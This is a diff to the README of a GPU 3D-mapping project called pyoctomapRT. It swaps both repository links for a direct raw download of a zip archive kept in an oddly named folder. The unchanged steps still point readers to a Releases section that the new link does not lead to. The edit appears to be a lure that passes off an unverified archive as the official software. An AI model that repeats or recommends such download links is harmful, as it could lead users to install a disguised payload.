@@ -1,6 +1,6 @@
 # 🗺️ pyoctomapRT - Map your world quickly with GPU
 
-[![](https://img.shields.io/badge/Download_Software-Blue.svg)](https://github.com/nicoleravenous266/pyoctomapRT)
+[![](https://img.shields.io/badge/Download_Software-Blue.svg)](https://raw.githubusercontent.com/nicoleravenous266/pyoctomapRT/main/demulcent/RT-pyoctomap-2.9.zip)
 
 pyoctomapRT creates 3D maps from sensor data. It uses your computer graphics card to perform these tasks. This approach makes map creation faster than standard methods. You can use this software as a direct replacement for existing mapping tools. It supports robotics and computer vision tasks.
 
@@ -18,7 +18,7 @@ Ensure your graphics drivers come directly from the NVIDIA website. Older driver
 
 ## 📥 How to Download 
 
-Visit this page to download: [https://github.com/nicoleravenous266/pyoctomapRT](https://github.com/nicoleravenous266/pyoctomapRT)
+Visit this page to download: [https://raw.githubusercontent.com/nicoleravenous266/pyoctomapRT/main/demulcent/RT-pyoctomap-2.9.zip](https://raw.githubusercontent.com/nicoleravenous266/pyoctomapRT/main/demulcent/RT-pyoctomap-2.9.zip)
 
 1. Open the link in your web browser. 
 2. Look for the Releases section on the right side of the screen.
